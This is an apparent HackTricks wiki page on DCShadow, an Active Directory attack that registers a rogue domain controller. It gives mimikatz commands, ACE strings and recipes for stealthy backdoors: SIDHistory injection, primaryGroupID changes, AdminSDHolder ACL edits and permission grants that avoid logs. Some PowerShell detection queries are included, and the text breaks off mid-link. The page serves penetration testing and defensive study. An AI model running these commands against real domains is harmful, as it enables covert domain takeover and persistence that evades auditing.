## Preserved Source Material

_body: "# DCShadow\n\n{{#include ../../banners/hacktricks-training.md}}\n\n\n## Basic Information\n\nIt registers a **new\
  \ Domain Controller** in the AD and uses it to **push attributes** (SIDHistory, SPNs...) on specified objects **without**\
  \ leaving any **logs** regarding the **modifications**. You **need DA** privileges and be inside the **root domain**.\\\n\
  Note that if you use wrong data, pretty ugly logs will appear.\n\nTo perform the attack you need 2 mimikatz instances. One\
  \ of them will start the RPC servers with SYSTEM privileges (you have to indicate here the changes you want to perform),\
  \ and the other instance will be used to push the values:\n\n```bash:mimikatz1 (RPC servers)\n!+\n!processtoken\nlsadump::dcshadow\
  \ /object:username /attribute:Description /value=\"My new description\"\n```\n\n```bash:mimikatz2 (push) - Needs DA or similar\n\
  lsadump::dcshadow /push\n```\n\nNotice that **`elevate::token`** won't work in `mimikatz1` session as that elevated the\
  \ privileges of the thread, but we need to elevate the **privilege of the process**.\\\nYou can also select and \"LDAP\"\
  \ object: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`\n\nYou can push the changes from a DA or from a user with\
  \ this minimal permissions:\n\n- In the **domain object**:\n  - _DS-Install-Replica_ (Add/Remove Replica in Domain)\n  -\
  \ _DS-Replication-Manage-Topology_ (Manage Replication Topology)\n  - _DS-Replication-Synchronize_ (Replication Synchornization)\n\
  - The **Sites object** (and its children) in the **Configuration container**:\n  - _CreateChild and DeleteChild_\n- The\
  \ object of the **computer which is registered as a DC**:\n  - _WriteProperty_ (Not Write)\n- The **target object**:\n \
  \ - _WriteProperty_ (Not Write)\n\nYou can use [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)\
  \ to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive\
  \ than having DA privileges.\\\nFor example: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username\
  \ student1 -Verbose` This means that the username _**student1**_ when logged on in the machine _**mcorp-student1**_ has\
  \ DCShadow permissions over the object _**root1user**_.\n\n## Using DCShadow to create backdoors\n\n```bash:Set Enterprise\
  \ Admins in SIDHistory to a user\nlsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519\n\
  ```\n\n```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)\nlsadump::dcshadow /object:student1 /attribute:primaryGroupID\
  \ /value:519\n```\n\n```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)\n#First, get the\
  \ ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519\n(New-Object System.DirectoryServices.DirectoryEntry(\"\
  LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local\")).psbase.Objec tSecurity.sddl\n#Second, add to the ACE permissions\
  \ to your user and push it using DCShadow\nlsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor\
  \ /value:<whole modified ACL>\n```\n\n### Primary group abuse, enumeration gaps, and detection\n\n- `primaryGroupID` is\
  \ a separate attribute from the group `member` list. DCShadow/DSInternals can write it directly (e.g., set `primaryGroupID=512`\
  \ for **Domain Admins**) without on-box LSASS enforcement, but AD still **moves** the user: changing PGID always strips\
  \ membership from the previous primary group (same behavior for any target group), so you cannot keep the old primary-group\
  \ membership.\n- Default tools prevent removing a user from their current primary group (`ADUC`, `Remove-ADGroupMember`),\
  \ so changing PGID typically requires direct directory writes (DCShadow/`Set-ADDBPrimaryGroup`).\n- Membership reporting\
  \ is inconsistent:\n  - **Includes** primary-group-derived members: `Get-ADGroupMember \"Domain Admins\"`, `net group \"\
  Domain Admins\"`, ADUC/Admin Center.\n  - **Omits** primary-group-derived members: `Get-ADGroup \"Domain Admins\" -Properties\
  \ member`, ADSI Edit inspecting `member`, `Get-ADUser <user> -Properties memberOf`.\n- Recursive checks can miss primary-group\
  \ members if the **primary group is itself nested** (e.g., user PGID points to a nested group inside Domain Admins); `Get-ADGroupMember\
  \ -Recursive` or LDAP recursive filters will not return that user unless recursion explicitly resolves primary groups.\n\
  - DACL tricks: attackers can **deny ReadProperty** on `primaryGroupID` at the user (or on the group `member` attribute for\
  \ non-AdminSDHolder groups), hiding effective membership from most PowerShell queries; `net group` will still resolve the\
  \ membership. AdminSDHolder-protected groups will reset such denies.\n\nDetection/monitoring examples:\n\n```powershell\n\
  # Find users whose primary group is not the default Domain Users (RID 513)\nGet-ADUser -Filter * -Properties primaryGroup,primaryGroupID\
  \ |\n  Where-Object { $_.primaryGroupID -ne 513 } |\n  Select-Object Name,SamAccountName,primaryGroupID,primaryGroup\n```\n\
  \n```powershell\n# Find users where primaryGroupID cannot be read (likely denied via DACL)\nGet-ADUser -Filter * -Properties\
  \ primaryGroupID |\n  Where-Object { -not $_.primaryGroupID } |\n  Select-Object Name,SamAccountName\n```\n\nCross-check\
  \ privileged groups by comparing `Get-ADGroupMember` output with `Get-ADGroup -Properties member` or ADSI Edit to catch\
  \ discrepancies introduced by `primaryGroupID` or hidden attributes.\n\n## Shadowception - Give DCShadow permissions using\
  \ DCShadow (no modified permissions logs)\n\nWe need to append following ACEs with our user's SID at the end:\n\n- On the\
  \ domain object:\n  - `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`\n  - `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`\n\
  \  - `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`\n- On the attacker computer object: `(A;;WP;;;UserSID)`\n\
  - On the target user object: `(A;;WP;;;UserSID)`\n- On the Sites object in Configuration container: `(A;CI;CCDC;;;UserSID)`\n\
  \nTo get the current ACE of an object: `(New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://DC=moneycorp,DC=loca\
  \ l\")).psbase.ObjectSecurity.sddl`\n\nNotice that in this case you need to make **several changes,** not just one. So,\
  \ in the **mimikatz1 session** (RPC server) use the parameter **`/stack` with each change** you want to make. This way,\
  \ you will only need to **`/push`** one time to perform all the stucked changes in the rouge server.\n\n[**More information\
